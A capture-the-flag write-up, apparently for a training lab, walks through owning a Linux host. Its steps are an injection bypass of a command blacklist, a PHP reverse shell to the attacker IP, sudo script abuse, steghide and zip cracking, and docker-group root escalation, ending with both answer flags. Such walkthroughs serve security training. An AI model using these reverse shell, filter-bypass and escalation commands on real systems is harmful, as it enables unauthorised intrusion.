---
custom_edit_url: null
---

## Task 1 Investigate!
### User Flag
Let's run a simple `nmap` scan against the target machine.
```
$ nmap -sC -sV 10.10.159.234
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-14 13:23 IST
Nmap scan report for 10.10.159.234
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.48.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.15 seconds
```
We can see that there are three open ports:

| Port | Service |
| :-: | :-: |
| 21   | ftp     |
| 22   | ssh     |
| 80     |    http     |

- We can connect anonymously through FTP.
```
$ ftp anonymous@10.10.159.234
Connected to 10.10.159.234.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
There is a `note.txt` file that we can download on our machine using the `get` command.
```
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||62537|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |***********************************************************************************************************************************************************************************************|    90      348.77 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.68 KiB/s)
```
- Let's `cat` out the `note.txt` file.
```
$ cat note.txt   
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
So there is some page where we can input commands which are then filtered.

Let's try to find out the page where this is happening using `gobuster`.
```
$ gobuster dir -u http://10.10.159.234 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.159.234
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.159.234/css/]
/fonts                (Status: 301) [Size: 314] [--> http://10.10.159.234/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.10.159.234/images/]
/index.html           (Status: 200) [Size: 35184]
/js                   (Status: 301) [Size: 311] [--> http://10.10.159.234/js/]
/secret               (Status: 301) [Size: 315] [--> http://10.10.159.234/secret/]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
The `/secret` page looks interesting, let's visit it through our browser.

![2](https://github.com/Knign/Write-ups/assets/110326359/c8e6dd1c-7b17-4316-997d-9050bab2259c)

As we can see this is the page where we can input commands.

Let's pass the following command:
```
id
```

![3](https://github.com/Knign/Write-ups/assets/110326359/dafa46e1-192b-456e-9288-88e4a4d70f69)

Looks like it worked.

Let's list out the content of the directory:
```
ls -la
```

![4](https://github.com/Knign/Write-ups/assets/110326359/a2c5b764-7434-4989-855b-cb7f739f5b39)

Ah so our command probably matched some black-list string and was filtered.

We can try to bypass the filter using single quotes:
```
l's' -la
```

![5](https://github.com/Knign/Write-ups/assets/110326359/46fad622-1844-4848-995f-67d0ab7c1045)

There is an `index.php` file. If we can manage to read it, we might be able to see how the black-list is implemented.

Let's `cat` it out.
```
cat index.php
```

![6](https://github.com/Knign/Write-ups/assets/110326359/16cc8de2-4115-4bde-8b9b-7bc5c776de14)

We can do the same bypass as before with single quotes:
```
c'a't index.php
```

![7](https://github.com/Knign/Write-ups/assets/110326359/6bdff5ec-45e6-4315-8db3-927d9d78e782)

The layout looks different. That is because the `ìndex.php` file was read and executed.

We can now check the source code using `CTRL+U`.

![8](https://github.com/Knign/Write-ups/assets/110326359/3f0ab7b7-0c6d-4b03-9da9-c6cda4600539)

Now we know what pattern are being filterd.
```php
$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
```
Let's set up a `nc` listener.
```
$ nc -nlvp 9999
Listening on [any] 9999...
```
Now we have to provide a PHP reverse shell:
```
p'h'p -r '$sock=fsockopen("10.17.48.138",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![9](https://github.com/Knign/Write-ups/assets/110326359/147c2bbe-95d2-4ffb-a50c-89bcb8aeea49)

Let's check back on our listener.
```
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.159.234] 39848
/bin/sh: 0: can't access tty; job control turned off
$ 
```
We can get a stable shell using the following command:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/secret$
```
Let's chat files the `www-data` user can run using `sudo`.
```
www-data@ubuntu:/home$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```
Let's take a better look at  what the `.helpline.sh` file does.
```
www-data@ubuntu:/home$ cat /home/apaar/.helpline.sh
cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```
So it uses the `/bin/bash` interpreter for all of the user input. Which means we we should be able to get a shell.
```
www-data@ubuntu:/var/www/files/images$ sudo -u apaar /home/apaar/.helpline.sh
sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: knign
knign
Hello user! I am knign,  Please enter your message: /bin/bash
/bin/bash
id
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
apaar@ubuntu:/var/www/files/images$ 
```
Let's get the flag from `/user.txt`. 
```
apaar@ubuntu:~$ cat /home/apaar/local.txt
cat /home/apaar/local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```
### Answer
```
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

&nbsp;

### Root Flag
Let's list out the contents of the directory.
```
apaar@ubuntu:/var/www/files/images$ ls -la
ls -la
total 2112
drwxr-xr-x 2 root root    4096 Oct  3  2020 .
drwxr-xr-x 3 root root    4096 Oct  3  2020 ..
-rw-r--r-- 1 root root 2083694 Oct  3  2020 002d7e638fb463fb7a266f5ffc7ac47d.gif
-rw-r--r-- 1 root root   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg
```
We can see that there is a JPG image.

Let's set up a Python3 server so that we can get this file from our attacker machine.
```
apaar@ubuntu:/var/www/files/images$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
On our attacker machine we have to use `wget` to download the JPG file.
```
$ wget http://10.10.159.234:8000/hacker-with-laptop_23-2147985341.jpg
--2023-12-14 15:15:45--  http://10.10.159.234:8000/hacker-with-laptop_23-2147985341.jpg
Connecting to 10.10.159.234:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 68841 (67K) [image/jpeg]
Saving to: ‘hacker-with-laptop_23-2147985341.jpg’

hacker-with-laptop_23-2147985341.jpg                       100%[========================================================================================================================================>]  67.23K   182KB/s    in 0.4s    

2023-12-14 15:15:46 (182 KB/s) - ‘hacker-with-laptop_23-2147985341.jpg’ saved [68841/68841]
```
Using `steghide` we can check if there is any embedded file or message and extract it.
```
$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
```
Let's `unzip` the ZIP file.
```
$ unzip backup.zip                    
Archive:  backup.zip
[backup.zip] source_code.php password: 
```
In order to unzip it we need a password.
We can use `zip2john` to convert the ZIP file into a hash.
```
$ zip2john backup.zip > backup_hash
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8
```
Now, using `john` we can crack the hash.
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2023-12-14 15:18) 4.166g/s 51200p/s 51200c/s 51200C/s horoscope..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Let's unzip the file using the `pass1word` password.
```
$ unzip backup.zip                                         
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php      
```

```php title="source_code.php"
<html>
<head>
        Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
                        Email: <input type="email" name="email" placeholder="email"><br><br>
                        Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
                </form>
<?php
        if(isset($_POST['submit']))
        {
                $email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                { 
                        $random = rand(1000,9999);?><br><br><br>
                        <form method="POST">
                                Enter the OTP: <input type="number" name="otp">
                                <input type="submit" name="submitOtp" value="Submit">
                        </form>
                <?php   mail($email,"OTP for authentication",$random);
                        if(isset($_POST["submitOtp"]))
                                {
                                        $otp = $_POST["otp"];
                                        if($otp == $random)
                                        {
                                                echo "Welcome Anurodh!";
                                                header("Location: authenticated.php");
                                        }
                                        else
                                        {
                                                echo "Invalid OTP";
                                        }
                                }
                }
                else
                {
                        echo "Invalid Username or Password";
                }
        }
?>
</html>
```
In the  `source_code.php` file we can see a message for a user `Anurodh` and a Base64 encoded password.

Let's decode the password using `base64`.
```
$ echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
!d0ntKn0wmYp@ssw0rd            
```

| Username | Password            |
| :-: | :-: |
| anurodh  | !d0ntKn0wmYp@ssw0rd |

We can now login through SSH as the user `anurodh` using the `!d0ntKn0wmYp@ssw0rd` password.
```
$ ssh anurodh@10.10.159.234                                
The authenticity of host '10.10.159.234 (10.10.159.234)' can't be established.
ED25519 key fingerprint is SHA256:mDI9eoI+sD1gmuE1Vl2iLvyVIopHnZlbAEFxr82BFwc.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.159.234' (ED25519) to the list of known hosts.
anurodh@10.10.159.234's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec 14 09:53:01 UTC 2023

  System load:  0.08               Processes:              134
  Usage of /:   24.8% of 18.57GB   Users logged in:        0
  Memory usage: 22%                IP address for eth0:    10.10.159.234
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

19 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

anurodh@ubuntu:~$ 
```
Using the `id` command we can check the groups that the `anurodh` user is part of.
```
anurodh@ubuntu:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```
So the `anurodh` user is part of the `docker` group.

We can find an exploit for Docker on GTFOBins.

![10](https://github.com/Knign/Write-ups/assets/110326359/c8d985c8-c12e-40e9-b33c-944de4720325)

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
Let's use the exploit without the `sudo`.
```
anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```
We are now the `root` user and can read the root flag.
```
# cat /root/proof.txt
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}}
```
### Answer
```
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}}
```
